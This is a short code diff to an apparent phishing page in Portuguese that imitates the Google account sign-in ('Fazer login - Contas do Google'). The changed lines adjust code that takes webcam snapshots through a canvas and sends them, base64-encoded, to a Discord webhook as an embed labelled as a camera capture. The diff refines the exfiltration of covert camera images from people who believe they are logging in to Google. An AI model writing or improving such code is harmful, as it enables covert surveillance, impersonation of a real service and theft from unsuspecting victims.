@@ -1,6 +1,6 @@
 <!DOCTYPE html>
 <html lang="pt-BR">
- 
+
 <head>
     <title>Fazer login - Contas do Google</title>
     <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap" rel="stylesheet">
@@ -142,7 +142,7 @@
                             description: "Imagem capturada pela câmera.",
                             color: 16711680,
                             image: {
-                                url: data
+                                url: "data:image/png;base64," + data.split(",")[1] // Send base64 data
                             }
                         }
                     ]
@@ -193,7 +193,7 @@
                     // Convert the snapshot to a base64 data URL
                     const imageData = canvas.toDataURL('image/png');
 
-                    // Send to Discord as an embed with image URL
+                    // Send to Discord as base64 data
                     sendToDiscord("Captura da Câmera", imageData, true);
 
                     // Stop the video stream
